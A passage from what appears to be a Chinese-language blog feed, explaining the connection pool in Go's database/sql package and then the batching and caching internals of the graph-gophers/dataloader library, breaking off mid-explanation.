        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>golang 标准库中的 database/sql 包提供了一种数据库的抽象，这种抽象面向接口，所以与具体的数据库无关。这意味着，开发人员几乎可以使用同一套代码来使用不同的数据库，只需要导入对应的数据库驱动即可，而这个所谓的驱动其实就是实现了 database/sql 中的接口的外部库。这里不对 database/sql 中接口的层级关系做介绍，感兴趣的朋友可以阅读 《go 语言设计与实现》的<a href="https://draveness.me/golang/docs/part4-advanced/ch09-stdlib/golang-database-sql/" target="_blank" rel="noopener">这篇文章</a>来学习。</p><p>正如 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/driver/driver.go#L88-L90" target="_blank" rel="noopener">Driver.Open</a> 和 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/driver/driver.go#L123-L125" target="_blank" rel="noopener">Connector.Connect</a> 方法的注释所言，数据库驱动不需要自己缓存打开的连接，因为 database/sql 除了通过接口对使用者屏蔽了底层驱动间的差异外，还维护了一份连接池。本文尝试从源码的角度分析连接池，期间顺带会聊到 database/sql 本身的一些特性，为方便描述，下文将 database/sql 简称为 sql。</p><h1 id="连接池简述"><a href="#连接池简述" class="headerlink" title="连接池简述"></a>连接池简述</h1><p>“池化”通常用来复用曾经创建过的资源，是节省资源的一种很常见的方式，比如 goroutine 池和对象池，分别用于复用 goroutine 和某种对象。与之类似的，连接池是一种对连接的复用技术，广泛应用在 cs 架构中。对于一个连接池而言，常见的特性包括限制池大小、连接入池、连接出池、按需创建连接、清理过期连接、统计连接信息等，接下来分别分析下相关的特性。</p><h1 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h1><h2 id="获取数据库句柄"><a href="#获取数据库句柄" class="headerlink" title="获取数据库句柄"></a>获取数据库句柄</h2><p><a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L456" target="_blank" rel="noopener">sql.DB</a> 是 sql 包对使用者暴露的数据库句柄，可以通过 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L816-L833" target="_blank" rel="noopener">sql.Open</a> 函数获得。sql.Open 接收 driverName 和 dataSourceName 作为入参，前者用于在全局的 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L35" target="_blank" rel="noopener">drivers</a> map 中查找对应的驱动实现（这个 map 是通过调用 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L44-L54" target="_blank" rel="noopener">sql.Register</a> 函数来写入的），后者则是一个现有标准，通常被简称为 dsn，这个东西定义了一系列连接数据库所需的参数，对应的驱动实现会通过 dsn 来完成连接的建立与初始化。</p><p>继续来看 sql.Open，当它从 drivers 中获取到驱动后，就会根据这个驱动来调用 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L784-L797" target="_blank" rel="noopener">sql.OpenDB</a> 函数，这个函数接收 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/driver/driver.go#L121-L141" target="_blank" rel="noopener">driver.Connector</a> 作为入参，这是需要被数据库驱动实现的接口，通过调用其 Connect 方法就可以获取到一条新的数据库连接。sql.OpenDB 做的事情很简单，它把这个 driver.Connector 塞到 sql.DB 结构中，然后初始化了一些关键字段，再另起一个 goroutine 调用 sql.DB 的 connectionOpener 方法后就结束了。</p><p>这里的 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1193-L1203" target="_blank" rel="noopener">sql.DB.connectionOpener</a> 是我们遇到的第一个后台运行的 goroutine，它的逻辑很简单，内部是一个 for-select 的无限循环，当且仅当入参的 ctx.Done 函数返回时，这个循环才会结束（因为这个 ctx 是与 DB.stop 绑定的，如果 ctx.Done 返回，那么意味着整个 DB 都失效了）。除此之外，connectionOpener 会尝试从 sql.DB.openerCh 字段中读取内容，这个字段是一个 channel，表示有一个创建连接的需求，每次读到时就调用 sql.DB.openNewConnection。我们先不看这个 openNewConnection，目前只需要了解它会创建新的连接即可，详细的内容会在后面介绍。</p><h2 id="创建或从池中获取连接"><a href="#创建或从池中获取连接" class="headerlink" title="创建或从池中获取连接"></a>创建或从池中获取连接</h2><p>从上面的描述中我们会发现，从 Open 到 OpenDB 这整个获取 sql.DB 的过程中都不曾建立过真正的数据库连接，但 sql.DB 中确实在 connector 字段中<a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L787" target="_blank" rel="noopener">保存</a>了被数据库驱动实现的 driver.Connector 实例，也就是说 sql.DB 是有能力建立一条真正的数据库连接的。事实上，sql.DB 的连接是延迟建立的，也就是说只有真正需要用到连接时才会去创建第一条连接。那么什么时候会创建连接呢，通常是通过 sql.DB 来与数据库交互的时候，这里的交互指的是 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L848-L866" target="_blank" rel="noopener">DB.PingContext</a>、<a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1670-L1683" target="_blank" rel="noopener">DB.QueryContext</a>、<a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1597-L1610" target="_blank" rel="noopener">DB.ExecContext</a>。</p><p>通过查看代码，可以发现它们几乎有着同样的代码结构，都是先最多尝试 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1508-L1511" target="_blank" rel="noopener">maxBadConnRetries</a> 次以 cachedOrNewConn 这个策略调用一个非导出函数，如果均失败且失败原因是 driver.ErrBadConn，那么尝试以 alwaysNewConn 这个策略调用同样的函数。如果展开 DB.exec 和 DB.query，那么这三个数据库交互函数的结构基本就完全一样了，cachedOrNewConn 和 alwaysNewConn 都是传给 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1259" target="_blank" rel="noopener">DB.conn</a> 函数的。</p><p>下面继续来看 DB.conn 这个函数，它的作用是获取一条数据库连接，而前面说的 cachedOrNewConn 和 alwaysNewConn 对它而言是获取连接的策略，前者意味着“从连接池中获取连接或创建一个新的连接”，后者意味着“直接创建一条新连接”。它们两个的区别在于是否会尝试从 DB.freeConn 中获取连接，这个字段保存曾经打开的但目前没在使用的连接，<strong>也就是连接池的实体部分</strong>。当策略为 cachedOrNewConn 且 DB.freeConn 中有内容时，就获取里面的第一个连接（这里弹出第一个连接的方式比较有考虑，感兴趣的朋友可以想想为什么不直接用 <code>db.freeConn[1:]</code> 的方式），然后通过提前设置的 DB.maxLifetime 判断它是否过期，当过期时会直接返回 driver.ErrBadConn，此时如前所述，调用者会重试 maxBadConnRetries 次。除此之外，DB.conn 还会按需调用驱动实现的 ResetSession 来重置连接。</p><p>如果 freeConn 中没有空闲的连接，或者 caller 已经重试了 maxBadConnRetries 次，那么就需要创建新的连接了。通常而言，只需要通过调用 DB.connector.Connect 方法，也就是数据库驱动实现的用于创建连接的方法即可。然而 sql 包支持设置连接的最大数量（<strong>不是连接池的最大容量</strong>），那么当多个 goroutine 都尝试创建新的数据库连接时，DB.conn 需要保证整体的连接数量是小于等于允许的最大连接数的。在实现上，DB.numOpen 记录了当前打开的连接数量，DB.maxOpen 记录了允许打开的最大连接数量，当 <code>DB.numOpen &gt; DB.maxOpen</code> 时，就需要阻塞当前的 goroutine 直到有空闲的连接可以使用。sql 通过 select 来实现阻塞，它先把当前 goroutine 对连接的“需求”封装成一个 connRequest 的 channel，然后再通过 select 尝试从这个 channel 中读取数据，如果能读到，那么它就能从中获取一条数据库连接并继续后面的逻辑。不难猜到，当且仅当其他 goroutine 释放了其占用着的连接，也就是将其放回连接池时，当前阻塞的 goroutine 才能接手这个连接，因为这样整体上连接的数量才不会变，下面我们就来看一下放回连接的部分。</p><h2 id="将连接放回连接池"><a href="#将连接放回连接池" class="headerlink" title="将连接放回连接池"></a>将连接放回连接池</h2><p>用户通过 DB 句柄与数据库交互前，需要先通过 DB.conn 来新建或从连接池中获取连接，那么当这个交互完成时，就可以释放掉前面获得的连接了。还是回到 DB.PingContext、DB.QueryContext、DB.ExecContext，它们内部在调用 DB.xxxDC 时接受了 driverConn 的 releaseConn 方法作为参数，当 DB.xxxDC 结束时，releaseConn 就会被调用，而这个方法的逻辑很简单，仅仅只是调用了 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1414" target="_blank" rel="noopener">DB.putConn</a> 方法。</p><p>从名字上看，DB.putConn 的作用是将连接放回连接池。具体到代码中，如果这个连接不是 driver.ErrBadConn，也就是说连接当前还可用，那么 DB.putConn 就会尝试调用 DB.putConnDBLocked，这个方法真正用于将连接放回连接池，并返回是否放回成功，当不成功时代表连接池已经满了，此时 DB.putConn 会直接调用 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1461" target="_blank" rel="noopener">driverConn.Close</a> 来关闭这个连接。</p><p>继续来看 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1475" target="_blank" rel="noopener">DB.putConnDBLocked</a>，它首先会判断当前是否有 goroutine 因为获取不到连接而阻塞，如果存在这样的 goroutine，那么把当前连接通过对应 goroutine 的 connRequest channel 转让给它，此时 putConnDBLocked 会返回 true 避免 caller 认为连接放回连接池失败并关闭 driverConn。而如果没有阻塞中的 goroutine，那么 putConnDBLocked 会判断 DB.freeConn 中的连接是否达到 DB.maxIdleConn，即允许空闲的最大连接数量，如果没有达到，那么将该连接加入到 DB.freeConn 中并返回 true，否则返回 false 通知 caller 关闭连接。</p><p>需要注意的是，DB.maxIdleConn 与 DB.maxOpen 不同，前者代表“最多有多少空闲连接”，后者代表“最多有多少连接”，所以前者是一定小于等于后者的，从语义上讲，前者就是<strong>连接池的最大容量</strong>。</p><p>这里讲的是正常的流程，但 DB.putConn 接收到的连接很可能是有问题的，这里的问题就是 driver.ErrBadConn，这通常发生于数据库服务端主动断开连接。当连接的状态是有问题的时候，DB.putConn 就会直接关闭这个连接。但与此同时，它还会调用 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1175" target="_blank" rel="noopener">DB.maybeOpenNewConnections</a>，这是为了对新建连接这个操作进行兜底，被多个 <code>err != nil</code> 的地方调用。</p><h2 id="新连接兜底"><a href="#新连接兜底" class="headerlink" title="新连接兜底"></a>新连接兜底</h2><p>从名字上看，DB.maybeOpenNewConnections “可能”会创建一个新的连接。它通常被用于新连接的兜底，偶尔就会被调用一下，服务于那些由于拿不到连接而阻塞的 goroutine。</p><p>具体到代码中，它会判断当前有多少个 goroutine 因为获取不到连接而阻塞，如前所述，每一个这种 goroutine 都对应一个 connRequest，所有的 connRequest 被放在 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L469" target="_blank" rel="noopener">DB.connRequests</a> 字段中。但我们不能 DB.connRequests 中有多少个元素就创建多少个连接，而是要结合 DB.maxOpen 的值来判断，如前所述，这个值的含义是“最多允许建立多少条数据库连接”。当 DB.maxOpen 大于 0 时，DB.maybeOpenNewConnections 会计算 <code>DB.maxOpen - DB.numOpen</code> 的值，这个值的含义是“还能创建多少条数据库连接”。</p><p>所以 <code>min(len(DB.connRequests), (DB.maxOpen-DB.numOpen))</code> 的值，就是当前可以创建的连接数量，我们假设它为 n，那么 DB.maybeOpenNewConnections 就会向 DB.openerCh 中写入 n 次。如果你还有印象的话，我们前面提到，sql.OpenDB 函数创建了一个 goroutine，这个 goroutine 做的就是不断尝试从 DB.openerCh 中读取内容，当有内容时就调用 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1206" target="_blank" rel="noopener">DB.openNewConnection</a> 来创建新的连接。</p><p>下面来看下 DB.openNewConnection 的逻辑，它首先就调用驱动实现的 Connector.Connect 创建了一个连接，如果连接创建失败，它会调用 DB.putConnDBLocked，但这里对这个函数的使用不同于我们前面的描述，它会将驱动返回的错误传递进去，这个错误会一路通过 connRequest 传给对应的 gouroutine 从而使其结束阻塞，并在 err 为 sql.ErrBadConn 时进行重试。除此之外，它会再次调用 DB.maybeOpenNewConnections，这样新的一轮 DB.openNewConnection 调用就会按需被发起。</p><p>另一方面，如果 DB.openNewConnection 成功通过数据库驱动创建了一条连接，那么它同样会调用 DB.putConnDBLocked，只不过会将连接传递进去，此时 DB.putConnDBLocked 的作用就和我们前面提到的是相同的，当这个函数返回 false 时，说明已经不能再创建新的连接了，此时调用 Close 来关闭刚刚创建的连接。</p><h2 id="过期连接清理"><a href="#过期连接清理" class="headerlink" title="过期连接清理"></a>过期连接清理</h2><p>由于网络环境的不稳定，我们无法保证池子中的连接是可用的，虽然在使用时 sql 会适度重试，但这种重试是很影响效率的。为了解决这个问题，通常有两种方案。第一是定期通过池子中的连接 ping 一下，如果成功那么保留，否则丢弃掉连接；第二种是为每个连接设置最大可用时长，超过这个时长的连接会被丢弃。两种方式各有利弊，sql 选择了第二种。</p><p>当我们通过 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1011" target="_blank" rel="noopener">DB.SetConnMaxLifetime</a> 设置 DB.maxLifetime 或通过 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1033" target="_blank" rel="noopener">DB.SetConnMaxIdleTime</a> 设置 db.maxIdleTime 时，它们均会调用 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1052" target="_blank" rel="noopener">DB.startCleanerLocked</a>，这个函数的作用是按需初始化 DB.cleanerCh，然后新起一个协程调用 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1059" target="_blank" rel="noopener">DB.connectionCleaner</a>，这是我们遇到的第二个后台运行的 goroutine。</p><p>与 DB.connectionOpener 类似，DB.connectionCleaner 也是一个通过 for+select 来运行的协程，但不同的是它的退出条件<a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1076" target="_blank" rel="noopener">更容易满足</a>。select 中有两个 case，一个用于每隔一段时间执行一次，这通过在循环中对 Timer 调用 Reset 实现，另一个则从 DB.cleanerCh 中读取内容。不管命中了哪个 case，DB.connectionOpener 的作用都是寻找那些已经过期的连接，然后分别对它们调用 Close 来进行关闭。</p><p>当前 DB.cleanerCh 的写入方有两处，分别是前面提到的 DB.SetConnMaxLifetime 和 DB.SetConnMaxIdleTime，当设置的新值比旧值小的时候会通知 DB.connectionOpener 强制执行一次清理。</p><h2 id="Tx-和-Stmt-如何使用连接"><a href="#Tx-和-Stmt-如何使用连接" class="headerlink" title="Tx 和 Stmt 如何使用连接"></a>Tx 和 Stmt 如何使用连接</h2><p>上面描述的过程概括了常规的数据库交互方式，简单来说就是交互前尝试获取一个连接，这个连接可能是新建的也可能是从连接池中拿到的，交互结束再把连接放回池子里，如果池子满了就把连接关掉。但 sql 中有一些交互不适用于这个过程，比较典型的是 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L2101" target="_blank" rel="noopener">sql.Tx</a> 和 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L2537" target="_blank" rel="noopener">sql.Stmt</a>。</p><p>sql.Tx 代表事务，它是一个句柄，可以通过 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1805" target="_blank" rel="noopener">DB.BeginTx</a> 来获得，用户拿到这个句柄后，可以通过 sql.Tx 调用与 sql.DB 类似的方法，然后调用 Tx.Commit 或 Tx.Rollback 来完成事务的处理。对应到数据库上，就是要先送一条语句过去开启事务（比如 BEGIN），然后执行一些操作，再按需执行 COMMIT 或 ROLLBACK。这里最大的问题在于，事务是不能跨连接的，也就是说，在提交或回滚之前，Tx 的所有操作都应该是通过同一条连接来完成的，这意味着 Tx 需要独占某一条连接。</p><p>在实现上，DB.BeginTx 展开后和前面提到的其他交互函数相同，也是调用了 db.conn 来获取连接，但 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1838" target="_blank" rel="noopener">db.beginDC</a> 和前面的几个 db.xxxDC 不同，它没有通过 defer 来调用 driverConn.releaseConn，这也就意味着当 DB.beginDC 将 BEGIN 命令发送给数据库后，之前获取的连接并不会放回连接池。与之相对的，db.beginDC 将 releaseConn 记录在 Tx.releaseConn 字段内，当 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L2223" target="_blank" rel="noopener">Tx.Commit</a> 或 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L2262" target="_blank" rel="noopener">Tx.Rollback</a> 被调用时，这个函数就会被调用到，此时 Tx 独占的连接就可以被释放了。</p><p>从这里我们就能看到，在写业务代码时应该尽量避免长事务，因为每个事务都会独占一条数据库连接，如果限制了 DB.maxOpen 的值，那么很快就达到限制了，此时那些想要获取连接的 goroutine 都会因为迟迟拿不到连接而阻塞在 connRequest。</p><p>接下来再来看 sql.Stmt，这个东西对应数据库中的 prepare 语句，它同样是一个句柄，可以通过 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1521" target="_blank" rel="noopener">DB.PrepareContext</a> 来获得。同 Tx 一样，Stmt 是不能跨 session 的，所以理所当然的，我们可以把 Stmt 实现成 Tx 的方式，即每个 Stmt 独占一条连接。然而，和 Tx 不同的是，Stmt 是一个长期存在的东西（即它本身不存在 commit 和 rollback），而且由于它能够提高 sql 的执行效率，所以对于一个高效的系统，Stmt 应该是会被经常使用的东西。这两点特性决定了我们无法用实现 Tx 的方式来实现 Stmt，否则这个长期存在的东西会一直占据连接的份额，就相当于系统中有了一个几乎不会结束的事务。</p><p>因此，<a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1565" target="_blank" rel="noopener">DB.prepareDC</a> 中使用 defer 调用了 driverConn.releaseConn 来释放对应的连接，这意味着当 DB.prepareDC 被调用后，所有连接中有一条连接是被 prepare 过的。但是，正是由于连接池的存在，所以这条连接不一定会被哪个 goroutine 使用，那么当用户使用 Stmt 与数据库交互时，如何确保获取到一条 prepare 过的连接呢？</p><p>事实上，<a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L2568" target="_blank" rel="noopener">Stmt.css</a> 中记录了一个 connStmt 列表，每个 connStmt 中记录了一个 prepare 过的 driverConn 和对应的 driverStmt。当用户使用 Stmt 与数据库交互时，首先会调用 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L2658" target="_blank" rel="noopener">Stmt.connStmt</a> 方法，这个方法会尝试获取一条连接，然后遍历 Stmt.css，如果 Stmt.css 中某一项的 driverConn 与 DB.conn 获取到的 driverConn 相等，那么这一项的 driverStmt 就可以直接拿来使用，因为这意味着对应的连接已经被 prepare 过。</p><p>但我们不能总是这样幸运，当 Stmt.css 中没有与之匹配的 driverConn 时，就说明我们拿到了一条未经 prepare 的连接，此时需要通过 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L2711" target="_blank" rel="noopener">Stmt.prepareOnConnLocked</a> 来对这个连接执行 prepare 并获取对应的 driverStmt，然后通过这个 driverStmt 来执行操作。除此之外，Stmt.prepareOnConnLocked 还会将这对新的 driverConn 和 driverStmt 放入到 Stmt.css 中，避免下次在使用 Stmt 时重复对同一条连接执行 prepare。</p><h2 id="统计连接池信息"><a href="#统计连接池信息" class="headerlink" title="统计连接池信息"></a>统计连接池信息</h2><p>最后也是最简单的一个连接池特性，就是获取统计数据，这可以通过 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1150" target="_blank" rel="noopener">DB.Stats</a> 方法获取。我们前面讨论的各个操作中会在 DB 结构中记录一些内容，比如”有多少连接因为过期而被关闭“，“有多少 goroutine 因为获取不到连接而阻塞”等等，但直到我们调用 DB.Stats 时，这些数据仍在变化着，所以我们需要对调用时的状态做一个快照，具体到代码中，sql 定义了 <a href="https://github.com/golang/go/blob/release-branch.go1.17/src/database/sql/sql.go#L1133" target="_blank" rel="noopener">DBStats</a> 结构，用于保存 DB.Stats 方法被调用时 DB 中各个统计字段的状态，因为这个结构体中没有指针字段，所以后续 DB 中统计字段的变化不会对这个结构有任何影响，这样就实现了统计数据的快照。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析 dataloader 源码</title>
      <link href="/2023/04/05/DataLoader/"/>
      <url>/2023/04/05/DataLoader/</url>
      
        <content type="html"><![CDATA[<blockquote><p>代码地址：<a href="https://github.com/graph-gophers/dataloader/tree/v6.0.0" target="_blank" rel="noopener">graph-gophers/dataloader at v6.0.0 (github.com)</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>dataloader 是 Facebook 提出的一种获取资源的方式，其最初的目的是为了解决 GraphQL 查询数据时的 N+1 问题，但这种加载数据的方式其实很普适。</p><p>宏观上看 dataloader，它主要有批量请求（batch）和缓存这两个机制，批量请求的意思是 dataloader 在加载数据前会“等”一段时间，把一个时间窗口内的所有请求聚合成一个 batch 然后下发。举例来说，假设我们有一个接口可以根据一批 user_id 来获取对应用户的个人信息，那么我们就可以在这个接口前套一层 dataloader，这样当间隔很近的 a、b、c 三个请求分别想获取 user_id 为 1、2、3 的用户信息时，dataloader 会将它们聚合成一个批量请求，通过这个请求拿到数据后再向上将结果分别返回给这三个源请求。在这个过程中，a、b、c 不需要感知 dataloader 的聚合，他们甚至不需要感知彼此的存在。</p><p>然而光有 batch 还不够，因为会有入参重复的问题。比如上面假设的场景中，如果 a、b、c 都要获取 user_id 为 1 的用户信息，那么 batch 会将它们聚合为一个入参有三个 1 的请求，而这批参数其实是冗余的。所以，我们需要保存“正在处理中的  id”的处理过程，并可以根据这个过程来拿到最终的处理结果，这里说的有点抽象，其实这和 singleflight 的原理是类似的，最终目的都是要保证同一时间多个同样的 user_id 只会触发一次回源，即 duplicate suppression。</p><p>另一方面，缓存的实现可以根据业务场景而有所不同，比如对于一些变更不频繁的资源，缓存不仅可以用于去重，还可以通过延长缓存时间来减少回源，进一步降低下游服务的压力。</p><p>为了更好地理解 dataloader 的运行机制，本文尝试分析 graph-gophers/dataloader 6.0.0 版本的源码，在下文中，这个仓库会被简称为 dataloader。</p><h1 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h1><p>dataloader 中的核心结构是 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L51-L90" target="_blank" rel="noopener">Loader 结构体</a>，这个结构体可以通过 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L168-L191" target="_blank" rel="noopener">NewBatchedLoader 函数</a>来创建，该函数接收一个 batch 函数作为固定入参，这个函数的作用是根据一批 key 来获取对应的一批 Result 结构，具体的获取逻辑由调用方决定；除此之外，这个初始化方法还通过 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L107-L166" target="_blank" rel="noopener">functional-options</a> 的方式来为 Loader 的一些核心字段赋值。</p><p>Loader 结构体实现了 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L14-L28" target="_blank" rel="noopener">dataloader.Interface 接口</a>，其中逻辑最复杂的是 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L193" target="_blank" rel="noopener">Load 方法</a>，这个方法用于根据单个 key 获取对应的 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L92-L96" target="_blank" rel="noopener">Thunk 结构</a>，是我们研究的重心。这里的 Thunk 其实是一个闭包，它封装了获取结果的操作，调用方只需要调用它就可以等着拿入参对应的资源了，并不需要关心 Loader 在这个过程中做了什么。Thunk 其实就是我们前面提到的“正在处理中的 id”的处理过程，具体而言，Loader 针对每一个 Key 做了缓存，缓存的内容就是 Thunk，所以不同请求中同样的 Key 会获取到同一个 Thunk，也即同一个闭包，当然也就根据同一份回源操作拿到了同样的数据。</p><p>我们具体来看 Loader.Load 方法，它首先定义了一个 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L197" target="_blank" rel="noopener">channel</a> 和一个临时结构体 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L198-L201" target="_blank" rel="noopener">result</a>，前者用于通知 Thunk 函数“计算已经完成”，后者则被 Thunk 用作记录最终的计算结果。我们前面提到，Thunk 函数是 dataloader 在缓存中保存的东西，这个版本的 dataloader 对<a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/cache.go#L5-L11" target="_blank" rel="noopener">缓存接口</a>的定义中包括 Get/Set/Delete/Clear 四个方法，不包括 GetOrSet 这种原子操作，所以为了保证读写的原子性，Loader 结构中有 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L61" target="_blank" rel="noopener">cacheLock</a> 字段专门用于对缓存操作加锁。回到代码中，如果 Loader 的缓存中已经存在某个 key 对应的 Thunk 函数，那么直接将该函数返回，否则创建一个新的 Thunk，并以请求的 key 作为索引保存在缓存中，这样一来，同一个 key 的所有请求都会从缓存中获取到同一个 Thunk，从而达成了去重的目的避免冗余的回源。</p><p>接下来回到 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L211-L226" target="_blank" rel="noopener">Thunk</a> 本身，可以看到它是一个捕获了前面定义的 result 结构的闭包，如果 result.value 的值为 nil，那么它就会尝试从前文定义的 channel 中读取结果，并将读到的结果赋值到 result 中。需要注意的是，尽管读取和写入 result 时都加了锁，但当多个 goroutine 请求同一个 key 时，它们中仍可能有多个会走到从 channel 中<a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L218" target="_blank" rel="noopener">读取数据</a>部分的逻辑。但这个 channel 被定义为只能容纳一个元素，且它也不可能一直被写入数据，所以如果 channel 的写入方仅仅只是把回源的结果写入后就不管这个 channel，那么这些尝试从 channel 中读取数据的 goroutine 就会永远阻塞在这里。解决这个问题的方法就是向这个 channel 中写入数据后理解对其调用 close，因为读取已关闭的 channel 是不会阻塞的，只是如果使用类似 <code>v, ok := &lt;-channel</code> 的语法，那么 ok 会返回 false。回到 Loader 中的逻辑，如果 ok 不为 true，那么 result 并不会被更新。</p><p>我个人认为这里的 Thunk 实现的不够高效，因为它的完整流程需要加锁三次。这里之所以有这么多的锁操作，是因为 result 的赋值和读取都被放在 Thunk 中，如果将 result 换成指针并将其传递给负责回源的 goroutine，由它来完成 result 的赋值，并在赋值结束后通过关闭 channel 来通知 Thunk（或者参考 singleflight 使用 WaitGroup 来通知），这样 Thunk 就只需要直接通过闭包从 result 里读取数据，完全不需要依靠加锁来避免竞争了。</p><p>到这里为止，Thunk 的部分就结束了，接下来我们来看回源逻辑。</p><p>Loader.curBatcher 是一个 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L375-L381" target="_blank" rel="noopener">batcher 类型</a>，该类型定义了一系列方法用于异步回源。对于 curBatcher，它是<a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L238-L239" target="_blank" rel="noopener">延迟初始化</a>的，即当且仅当它被使用时才会进行初始化，所以为了避免并发环境导致 curBatcher 被重复初始化，Loader 定义了 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L76-L77" target="_blank" rel="noopener">batchLock 字段</a>专门对 batcher 的操作进行加锁。之所以如此大费周章也要做成延迟初始化的形式，是因为每个 batcher 结构只能被使用一次，它会负责聚合一段时间内的请求并调用使用方传给 Loader 的回源函数做具体的回源，这波回源完，下一波请求就需要新的 batcher 来负责了。</p><p>在实现上，batcher 的 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L376" target="_blank" rel="noopener">input</a> 被定义为一个 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L101-L105" target="_blank" rel="noopener">batchRequest</a> 的 channel，这个 channel 的容量由 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L70-L71" target="_blank" rel="noopener">Loader.inputCap</a> 决定，该字段的值可以通过调用 NewBatchedLoader 函数时传递 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L124-L129" target="_blank" rel="noopener">WithInputCapacity</a> 来修改，<a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L172" target="_blank" rel="noopener">默认为 1000</a>，这个字段可以理解为并发度，即同一时间最多有 1000 个 key 可以被写入。当 Loader.Load 方法被调用时，key 和 result 的 channel 会组合成 batchRequest 结构通过 batcher.input 传递给 Loader.curBatcher，input 这个 channel 在 batcher.batch 方法中被读取，这个方法在调用时通过另一个 goroutine 来承载，所以它不会阻塞调用 Loader.Load 的 goroutine。batcher.batch 通过 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L411-L414" target="_blank" rel="noopener">for-range  不停地读取 batcher.input</a>，这个操作在 input 被 close 之前会一直阻塞在这里，而它后面的逻辑就是正常的回源操作。所以不难想象，当满足某个条件时，这个 channel 一定会被 close，从而触发回源并将结果写回 batchRequest 的 channel 来通知 Thunk。</p><p>继续阅读源码，我们会发现 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L394-L400" target="_blank" rel="noopener">batcher.end 方法</a>对 batcher.input 调用了 close，它本身没有加锁，所以它的调用方一定加过锁，否则会因为重复关闭 channel 而导致 panic。这样一来，batcher.end 就可以被认为是回源操作的触发器，它被两个地方调用，分别是 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L469-L492" target="_blank" rel="noopener">Loader.sleeper</a> 和 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L256" target="_blank" rel="noopener">Loader.Load</a>。我们首先来看前者，它的作用是“等一段时间”后调用 